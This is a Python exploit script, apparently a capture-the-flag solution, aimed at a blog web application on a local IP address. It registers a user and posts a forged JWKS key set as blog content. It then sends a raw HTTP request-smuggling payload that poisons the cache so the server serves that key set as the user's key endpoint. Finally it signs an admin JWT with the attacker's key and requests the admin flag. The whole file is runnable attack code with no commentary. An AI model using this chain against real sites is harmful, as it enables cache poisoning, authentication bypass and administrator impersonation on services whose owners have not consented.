import requests
import string
import random
import time
import jwt

from pwn import *

def random_string():
    res = "".join(random.choices(string.ascii_uppercase + string.digits, k=32))
    return res

f = open("jwks.json", "r")
jwks = f.read()
f.close()

host = "192.168.88.206"
port = "8080"
base_url = "http://{}:{}".format(host,port)
signup_url = base_url + "/signup"
login_url = base_url + "/login"
post_url = base_url + "/create_post"
flag_url = base_url + "/admin/flag"

jwks_url_template = base_url + "/{user_id}/.well-known/jwks.json"

s = requests.Session()


def signup(username, password):
    form_data = {"username": username, "password": password}
    r = s.post(signup_url, data=form_data, allow_redirects=False)
    return r.status_code == 302


def login(username, password):
    form_data = {"username": username, "password": password}
    r = s.post(login_url, data=form_data, allow_redirects=False)
    return r.status_code == 302


def create_blog_post(title, content):
    form_data = {"title": title, "content": content}
    r = s.post(post_url, data=form_data, allow_redirects=False)
    redir = r.headers.get("Location")
    parts = redir.rsplit("/", maxsplit=2)
    user_id = parts[1]
    post_id = parts[2]

    result = (len(user_id) == 36) and  (len(post_id) == 36)
    return (user_id, post_id), (r.status_code == 302 and result)


username = random_string()
password = random_string()

print(username)
print(password)
print(signup(username, password))
print(login(username, password))

(user_id, post_id), result = create_blog_post(jwks, "")
print(user_id, post_id, result)


def poison_cache(user_id, post_id):
    payload = "\r\n".join([
        "POST / HTTP/1.1", 
        "Host: {host}:{port}".format(host=host, port=port),
        "Transfer-Encoding: chunked\r\n"
        ])


    poison = "\r\n".join([
    "0",
    "",
    "GET /post/{user_id}/{post_id} HTTP/1.1".format(user_id=user_id, post_id=post_id),
    "Rik: X"
    ])

    to_poison = "\r\n".join([
    "GET /{user_id}/.well-known/jwks.json HTTP/1.1".format(user_id=user_id),
    "Host: {host}:{port}".format(host=host, port=port),
    ""
    ])


    content_length = len(poison)
    payload += "Content-Length: %d\r\n\r\n" % content_length
    payload += poison
    payload += to_poison
    print(payload.replace("\r",""), flush=True)


    r = remote(host,port)
    r.send(payload)
    r.close()

poison_cache(user_id, post_id)


time.sleep(3)
r = s.get(jwks_url_template.format(user_id=user_id))
print(r.text)

key = open("key.pem").read()
payload = {
    "user": "admin"
}
admin_jwt = jwt.encode(payload, key, "RS256")

headers = {
    "Authorization": "Bearer %s" % admin_jwt
}
r = s.get(flag_url, headers=headers)
print(r.text)

